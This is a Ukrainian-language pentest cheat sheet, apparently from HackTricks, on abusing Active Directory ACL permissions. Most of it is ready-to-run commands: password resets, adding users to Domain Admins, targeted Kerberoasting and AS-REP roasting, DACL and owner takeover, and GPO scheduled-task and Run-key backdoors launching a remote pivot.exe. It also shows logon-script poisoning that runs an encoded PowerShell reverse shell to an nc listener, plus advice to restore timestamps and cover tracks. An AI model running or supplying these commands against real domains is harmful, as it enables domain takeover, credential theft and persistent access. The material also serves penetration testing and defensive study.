# Зловживання Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка переважно є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для детальнішої інформації перегляньте оригінальні статті.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll права на користувача**

Ця привілегія дає нападнику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, нападник може:

- **Змінити пароль цілі**: Використовуючи `net user <username> <password> /domain`, нападник може скинути пароль користувача.
- З Linux це можна зробити так само через SAMR за допомогою Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Якщо обліковий запис вимкнено, зніміть прапорець UAC**: `GenericAll` дозволяє редагувати `userAccountControl`. З Linux, BloodyAD може видалити прапорець `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Призначте SPN обліковому запису користувача, щоб зробити його kerberoastable, потім використайте Rubeus і targetedKerberoast.py, щоб витягти та спробувати зламати ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Вимкніть попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` на користувачі, ви можете додати сертифікатну облікову інформацію і автентифікуватися від їхнього імені без зміни їхнього пароля. Див.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll для групи**

Ця привілегія дозволяє нападникові керувати членством у групі, якщо вони мають права `GenericAll` на групу, наприклад `Domain Admins`. Після визначення відмінного імені групи (distinguished name) за допомогою `Get-NetGroup`, нападник може:

- **Додати себе до групи Domain Admins**: Це можна зробити за допомогою прямих команд або використовуючи модулі, такі як Active Directory або PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux ви також можете використати BloodyAD, щоб додати себе до довільних груп, коли ви маєте над ними GenericAll/Write-права. Якщо цільова група вкладена в “Remote Management Users”, ви негайно отримаєте доступ WinRM на хостах, що визнають цю групу:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв на об'єкті комп'ютера або обліковому записі користувача дозволяє:

- **Kerberos Resource-based Constrained Delegation**: Дозволяє взяти під контроль об'єкт комп'ютера.
- **Shadow Credentials**: Використовуйте цю техніку для імітації комп'ютера або облікового запису користувача, експлуатуючи привілеї для створення Shadow Credentials.

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` на всі об'єкти певної групи (наприклад, `Domain Admins`), вони можуть:

- **Додати себе до групи Domain Admins**: Досягається шляхом поєднання команд `net user` та `Add-NetGroupUser`; цей метод дозволяє ескалацію привілеїв у межах домену.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) у групі**

Цей привілей дозволяє атакувальникам додавати себе до певних груп, таких як `Domain Admins`, за допомогою команд, що безпосередньо маніпулюють членством у групі. Використання наступної послідовності команд дозволяє самододавання:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Схожа привілея: вона дозволяє зловмисникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` на цих групах. Підтвердження та виконання цього права здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Наявність у користувача права `ExtendedRight` для `User-Force-Change-Password` дозволяє скинути пароль без знання поточного. Перевірка цього права та його експлуатація можуть виконуватись через PowerShell або альтернативні інструменти командного рядка, що пропонують кілька методів скидання пароля користувача, включно з інтерактивними сесіями та one-liners для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, що демонструє різноманітність векторів атак.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner на групі**

Якщо зловмисник виявить, що він має права `WriteOwner` над групою, він може змінити власника групи на себе. Це особливо критично, коли йдеться про групу `Domain Admins`, оскільки зміна власника дозволяє отримати ширший контроль над атрибутами групи та її складом. Процес передбачає визначення правильного об’єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника — або за SID, або за ім'ям.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Цей дозвіл дозволяє зловмиснику змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до скрипта входу користувача, щоб виконати шкідливий скрипт при вході користувача. Це досягається за допомогою команди `Set-ADObject` для оновлення властивості `scriptpath` цільового користувача, вказавши на скрипт зловмисника.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Маючи цей привілей, зловмисники можуть маніпулювати членством у групах, наприклад додавати себе або інших користувачів до конкретних груп. Цей процес включає створення об'єкта облікових даних, використання його для додавання або видалення користувачів із групи та перевірку змін у членстві за допомогою команд PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- З Linux, Samba `net` може додавати/видаляти членів, якщо ви маєте `GenericWrite` для групи (корисно, коли PowerShell/RSAT недоступні):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Володіння об'єктом AD і наявність привілеїв `WriteDACL` на ньому дозволяє нападникові надати собі привілеї `GenericAll` над об'єктом. Це досягається шляхом маніпуляцій ADSI, що дає повний контроль над об'єктом і можливість змінювати його членство в групах. Незважаючи на це, існують обмеження при спробі використати ці привілеї за допомогою модуля Active Directory і cmdlets `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Коли у вас є `WriteOwner` і `WriteDacl` над обліковим записом користувача або сервісним обліковим записом, ви можете повністю взяти його під контроль і скинути пароль за допомогою PowerView без знання старого пароля:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Примітки:
- Можливо, спочатку потрібно змінити власника на себе, якщо у вас є лише `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Перевіряйте доступ будь-яким протоколом (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Перерахування дозволів GPO

To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Можна визначити, на які комп'ютери застосовано конкретну політику, щоб усвідомити масштаб потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Щоб побачити, які політики застосовано до певного комп'ютера, можна використовувати команди на кшталт `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Визначення підрозділів (OU), на які впливає певна політика, можна здійснити за допомогою `Get-DomainOU`.

Ви також можете використовувати інструмент [**GPOHound**](https://github.com/cogiceo/GPOHound) для переліку GPO та пошуку в них проблем.

### Abuse GPO - New-GPOImmediateTask

Misconfigured GPOs can be exploited to execute code, for example, by creating an immediate scheduled task. This can be done to add a user to the local administrators group on affected machines, significantly elevating privileges:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, якщо встановлено, дозволяє створювати та зв'язувати нові GPOs і встановлювати налаштування, такі як registry values, щоб запускати backdoors на уражених комп'ютерах. Цей метод вимагає оновлення GPO і входу користувача в систему на комп'ютері для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse пропонує спосіб зловживання існуючими GPOs шляхом додавання завдань або зміни налаштувань без потреби створювати нові GPOs. Для застосування змін цей інструмент вимагає модифікації існуючих GPOs або створення нових за допомогою RSAT tools:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

GPO updates typically occur around every 90 minutes. To expedite this process, especially after implementing a change, the `gpupdate /force` command can be used on the target computer to force an immediate policy update. This command ensures that any modifications to GPOs are applied without waiting for the next automatic update cycle.

### Під капотом

При перевірці Запланованих завдань для певного GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання завдань типу `evilTask`. Такі завдання створюються за допомогою скриптів або інструментів командного рядка з метою змінити поведінку системи або підвищити привілеї.

Структура завдання, як показано у XML-конфігураційному файлі, згенерованому `New-GPOImmediateTask`, описує специфіку запланованого завдання — включно з командою для виконання та її тригерами. Цей файл ілюструє, як заплановані завдання визначаються та керуються в межах GPO, надаючи метод для виконання довільних команд або скриптів як частини застосування політики.

### Користувачі та групи

GPOs також дозволяють маніпулювати членством користувачів і груп на цільових системах. Редагуючи файли політик Users and Groups безпосередньо, нападники можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо через делегування прав управління GPO, що дозволяє змінювати файли політик, додаючи нових користувачів або змінюючи членство у групах.

XML-конфігураційний файл для Users and Groups описує, як ці зміни реалізуються. Додаючи записи до цього файлу, конкретним користувачам можна надати підвищені привілеї на уражених системах. Цей метод пропонує прямий підхід до ескалації привілеїв шляхом маніпуляції GPO.

Крім того, можна розглядати додаткові методи виконання коду або підтримки перстистентності, такі як використання скриптів входу/виходу, модифікація ключів реєстру для autoruns, встановлення програм через .msi файли або редагування конфігурацій служб. Ці техніки надають різні шляхи для підтримки доступу та контролю над цільовими системами через зловживання GPOs.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Знайти скрипти входу
- Перевірте атрибути користувача на наявність налаштованого скрипта входу:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Сканувати мережеві спільні папки домену, щоб виявити ярлики або посилання на scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Парсувати `.lnk` файли, щоб визначити цілі, що вказують у SYSVOL/NETLOGON (корисна техніка для DFIR і для атакувальників без прямого доступу до GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound відображає атрибут `logonScript` (scriptPath) на вузлах користувачів, якщо він присутній.

### Перевірте доступ на запис (don’t trust share listings)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як доступні лише для читання, але самі NTFS ACL все ще можуть дозволяти запис. Завжди перевіряйте:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Якщо розмір файлу або mtime змінюються, у вас є дозвіл на запис. Збережіть оригінали перед модифікацією.

### Poison a VBScript logon script for RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте на revshells.com) і збережіть оригінальну логіку, щоб не порушити бізнес-функцію:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Прослуховуйте свій хост і чекайте наступного інтерактивного входу:
```bash
rlwrap -cAr nc -lnvp 443
```
Примітки:
- Виконання відбувається під токеном користувача, що виконав вхід (не SYSTEM). Область дії — GPO link (OU, site, domain), який застосовує цей скрипт.
- Прибирайте сліди, відновлюючи оригінальний вміст/мітки часу після використання.


## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
